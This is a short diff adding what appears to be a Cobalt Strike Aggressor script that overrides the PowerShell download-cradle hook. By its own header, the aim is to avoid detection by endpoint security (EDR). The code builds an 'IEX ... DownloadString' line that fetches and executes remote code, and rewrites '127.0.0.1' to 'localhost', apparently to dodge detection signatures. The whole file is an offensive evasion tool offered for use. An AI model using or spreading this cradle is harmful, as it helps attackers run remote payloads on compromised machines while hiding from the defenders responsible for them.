@@ -1,0 +1,7 @@
+#Powershell Import Without Getting Caught By EDR
+
+set POWERSHELL_DOWNLOAD_CRADLE {
+    $data = "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+    $data = strrep($data, "127.0.0.1", "localhost");
+    return $data;
+}
